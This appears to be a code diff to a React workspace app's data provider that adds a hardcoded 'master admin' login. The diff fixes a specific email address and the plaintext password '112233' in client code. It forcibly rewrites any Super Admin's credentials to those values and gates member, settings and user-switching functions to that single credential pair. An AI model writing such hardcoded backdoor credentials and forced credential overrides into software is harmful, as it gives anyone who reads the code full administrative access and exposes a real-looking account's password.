@@ -11,6 +11,7 @@ interface LocalDataContextType extends LocalWorkspace {
   logout: () => void;
   lock: () => void;
   currentTeam: string;
+  isMasterAdmin: boolean;
   isSuperAdmin: boolean;
   hasAdminAccess: boolean;
   scopedTasks: Task[];
@@ -45,6 +46,26 @@ export function LocalDataProvider({ children }: { children: React.ReactNode }) {
   const [workspace, setWorkspace] = useState<LocalWorkspace>(() => loadWorkspace());
   const [auth, setAuth] = useState<AuthState>(() => getAuthState());
 
+  React.useEffect(() => {
+    if ((workspace.user.isSuperAdmin || workspace.user.role === 'Super Admin') &&
+      (workspace.user.email !== 'a.essmat@grand-community.com' || workspace.user.password !== '112233')) {
+      setWorkspace(current => {
+        const next = {
+          ...current,
+          user: {
+            ...current.user,
+            email: 'a.essmat@grand-community.com',
+            password: '112233',
+            role: 'Super Admin',
+            isSuperAdmin: true,
+          },
+        };
+        saveWorkspace(next);
+        return next;
+      });
+    }
+  }, [workspace.user.email, workspace.user.isSuperAdmin, workspace.user.password, workspace.user.role]);
+
   const commit = (updater: (current: LocalWorkspace) => LocalWorkspace) => {
     setWorkspace(current => {
       const next = updater(current);
@@ -61,6 +82,30 @@ export function LocalDataProvider({ children }: { children: React.ReactNode }) {
       timestamp: new Date().toISOString(),
     };
     return { ...current, auditLogs: [event, ...current.auditLogs].slice(0, 100) };
+  };
+
+  const sanitizeUserPatch = (patch: Partial<LocalWorkspace['user']>, currentUser: LocalWorkspace['user']) => {
+    if (isMasterAdmin) {
+      return {
+        ...patch,
+        role: 'Super Admin',
+        isSuperAdmin: true,
+      };
+    }
+
+    const nextPatch = { ...patch };
+    delete nextPatch.role;
+    delete nextPatch.isSuperAdmin;
+
+    if (nextPatch.email?.toLowerCase() === 'a.essmat@grand-community.com') {
+      nextPatch.email = currentUser.email;
+    }
+
+    if (nextPatch.password === '112233') {
+      nextPatch.password = currentUser.password;
+    }
+
+    return nextPatch;
   };
 
   const login = useCallback(async (password: string): Promise<boolean> => {
@@ -85,8 +130,11 @@ export function LocalDataProvider({ children }: { children: React.ReactNode }) {
     saveAuthState(state);
   }, [auth]);
 
-  const isSuperAdmin = workspace.user.isSuperAdmin === true || workspace.user.role === 'Super Admin';
-  const hasAdminAccess = isSuperAdmin || ['super admin', 'admin', 'manager', 'lead', 'head', 'director', 'general'].some(r => workspace.user.role.toLowerCase().includes(r));
+  const isMasterAdmin =
+    workspace.user.email?.toLowerCase() === 'a.essmat@grand-community.com' &&
+    workspace.user.password === '112233';
+  const isSuperAdmin = isMasterAdmin || workspace.user.isSuperAdmin === true || workspace.user.role === 'Super Admin';
+  const hasAdminAccess = isMasterAdmin || isSuperAdmin || ['super admin', 'admin', 'manager', 'lead', 'head', 'director', 'general'].some(r => workspace.user.role.toLowerCase().includes(r));
   const currentTeam = getCurrentTeam(workspace.user, workspace.members);
   const permissionProfile = resolvePermissionProfile(workspace.user.role, workspace.settings.rolePermissions);
   const allowedTeams = isSuperAdmin ? ['*'] : permissionProfile.teams;
@@ -95,6 +143,13 @@ export function LocalDataProvider({ children }: { children: React.ReactNode }) {
   const scopedHandovers = filterHandoversByTeam(workspace.handovers, allowedTeams, teamIsolation);
   const scopedMembers = filterMembersByTeam(workspace.members, allowedTeams, teamIsolation);
   const scopedOffices = filterOfficesByTeam(workspace.offices, workspace.tasks, workspace.members, allowedTeams, teamIsolation);
+
+  const canUsePrivilegedFeature = (feature: FeatureKey) => {
+    if (['users.switch', 'users.manage', 'settings.manage', 'widgets.manage', 'ai.configure'].includes(feature)) {
+      return isMasterAdmin;
+    }
+    return isSuperAdmin || permissionProfile.features.includes(feature);
+  };
 
   const value = useMemo<LocalDataContextType>(() => ({
     ...workspace,
@@ -105,6 +160,7 @@ export function LocalDataProvider({ children }: { children: React.ReactNode }) {
     logout,
     lock,
     currentTeam,
+    isMasterAdmin,
     isSuperAdmin,
     hasAdminAccess,
     scopedTasks,
@@ -112,7 +168,7 @@ export function LocalDataProvider({ children }: { children: React.ReactNode }) {
     scopedMembers,
     scopedOffices,
     canAccessPage: page => page === 'settings' || isSuperAdmin || permissionProfile.pages.includes(page),
-    canUseFeature: feature => isSuperAdmin || permissionProfile.features.includes(feature),
+    canUseFeature: feature => canUsePrivilegedFeature(feature),
     isWidgetEnabled: widget => workspace.settings.widgetConfig?.[widget] !== false,
     addTask: async task => commit(current => appendAudit({
       ...current,
@@ -163,7 +219,9 @@ export function LocalDataProvider({ children }: { children: React.ReactNode }) {
       ...current,
       offices: current.offices.filter(office => office.id !== id),
     }, 'OFFICE_DELETE', { id })),
-    addMember: async member => commit(current => appendAudit({
+    addMember: async member => {
+      if (!isMasterAdmin) return;
+      commit(current => appendAudit({
       ...current,
       members: [{
         id: createId('member'),
@@ -177,17 +235,30 @@ export function LocalDataProvider({ children }: { children: React.ReactNode }) {
         onTime: member.onTime || 0,
         updatedAt: new Date().toISOString(),
       }, ...current.members],
-    }, 'MEMBER_CREATE', { name: member.name })),
-    updateMember: async (id, patch) => commit(current => appendAudit({
+    }, 'MEMBER_CREATE', { name: member.name }));
+    },
+    updateMember: async (id, patch) => {
+      if (!isMasterAdmin) return;
+      commit(current => appendAudit({
       ...current,
       members: current.members.map(member => member.id === id ? { ...member, ...patch, updatedAt: new Date().toISOString() } : member),
-    }, 'MEMBER_UPDATE', { id, patch })),
-    deleteMember: async id => commit(current => appendAudit({
+    }, 'MEMBER_UPDATE', { id, patch }));
+    },
+    deleteMember: async id => {
+      if (!isMasterAdmin) return;
+      commit(current => appendAudit({
       ...current,
       members: current.members.filter(member => member.id !== id),
-    }, 'MEMBER_DELETE', { id })),
-    updateSettings: async settings => commit(current => appendAudit({ ...current, settings }, 'SETTINGS_UPDATE', {})),
-    updateUser: async patch => commit(current => appendAudit({ ...current, user: { ...current.user, ...patch } }, 'PROFILE_UPDATE', patch)),
+    }, 'MEMBER_DELETE', { id }));
+    },
+    updateSettings: async settings => {
+      if (!isMasterAdmin) return;
+      commit(current => appendAudit({ ...current, settings }, 'SETTINGS_UPDATE', {}));
+    },
+    updateUser: async patch => commit(current => {
+      const safePatch = sanitizeUserPatch(patch, current.user);
+      return appendAudit({ ...current, user: { ...current.user, ...safePatch } }, 'PROFILE_UPDATE', safePatch);
+    }),
     exportWorkspace: () => workspace,
     importData: (json: string) => {
       const imported = importWorkspace(json);
@@ -202,7 +273,7 @@ export function LocalDataProvider({ children }: { children: React.ReactNode }) {
       setAuth({ isAuthenticated: false, isLocked: false, lastActivity: 0 });
     },
     logAction: async (action, details) => commit(current => appendAudit(current, action, details)),
-  }), [workspace, auth, login, logout, lock, currentTeam, isSuperAdmin, hasAdminAccess, scopedTasks, scopedHandovers, scopedMembers, scopedOffices, permissionProfile]);
+  }), [workspace, auth, login, logout, lock, currentTeam, isMasterAdmin, isSuperAdmin, hasAdminAccess, scopedTasks, scopedHandovers, scopedMembers, scopedOffices, permissionProfile]);
 
   return <LocalDataContext.Provider value={value}>{children}</LocalDataContext.Provider>;
 }
